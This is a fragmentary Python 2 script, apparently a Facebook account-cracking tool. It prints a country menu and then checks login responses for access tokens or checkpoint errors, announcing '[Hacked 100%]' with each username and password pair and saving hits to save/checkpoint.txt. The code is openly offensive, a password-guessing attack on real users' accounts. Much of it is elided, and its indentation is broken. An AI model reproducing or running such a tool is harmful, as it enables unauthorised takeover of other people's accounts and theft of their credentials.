...
def Zeek():
    ...
    time.sleep(0.05)
    print"\033[1;94m[2]\x1b[1;97mUSA"
    time.sleep(0.05)
    print"\033[1;94m[3]\x1b[1;97mU.k"
    time.sleep(0.05)
    print"\033[1;94m[4]\x1b[1;97mIndia"
    time.sleep(0.05)
    print"\033[1;94m[5]\x1b[1;97mBrazil"
    time.sleep(0.05)
    print"\033[1;94m[6]\x1b[1;97mJapan"
    time.sleep(0.05)
    print"\033[1;94m[7]\x1b[1;97mkorea"
    time.sleep(0.05)
    print"\033[1;94m[8]\x1b[1;97mitly"
    time.sleep(0.05)
    print"\033[1;94m[9]\x1b[1;97mspain"
    time.sleep(0.05)
    print"\033[1;94m[10]\x1b[1;97mpoland"
    time.sleep(0.05)
    print '\033[1;93m[11] Pakistan'
    time.sleep(0.05)
    print"\033[1;94m[12]\x1b[1;97mindonesia"
    time.sleep(0.05)
    print"\033[1;94m[13]\x1b[1;97mGreece"
    time.sleep(0.05)
    print"\033[1;94m[14]\x1b[1;97mAustrlia"
    time.sleep(0.05)
    print"\033[1;94m[15]\x1b[1;97mCanada"
    time.sleep(0.05)
    print"\033[1;94m[16]\x1b[1;97mCHINA"
    time.sleep(0.05)
    print"\033[1;94m[17]\x1b[1;97mdenmark"
    time.sleep(0.05)
    print"\033[1;94m[18]\x1b[1;97mFrance"
    time.sleep(0.05)
    print"\033[1;94m[19]\x1b[1;97mGermany"
    time.sleep(0.05)
    print"\033[1;94m[20]\x1b[1;97mSarilanka"
    time.sleep(0.05)
				...
				if 'www.facebook.com' in q['error_msg']:
					...
					cpb.append(c+user+pass1)
 				    ...
 				    if 'access_token' in q:
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;92m[Hacked 100%💉] ' + k + c + user + '  》  ' + pass2+'\n'
 					        cps = open('save/checkpoint.txt', 'a')
 				            ...
 				            if 'access_token' in q:
 				                ...
 				                if 'www.facebook.com' in q['error_msg']:
 					                print '\033[1;96m[Hacked 100%💉] ' + k + c + user + '  》  ' + pass3+'\n'
 					                cps = open('save/checkpoint.txt', 'a')
 				                    ...
 				                    if 'access_token' in q:
 				                        ...
 				                        if 'www.facebook.com' in q['error_msg']:
 					                        print '\033[1;92m[Hacked 100%💉] ' + k + c + user + '  》  ' + pass4+'\n'
 					                        cps = open('save/checkpoint.txt', 'a')
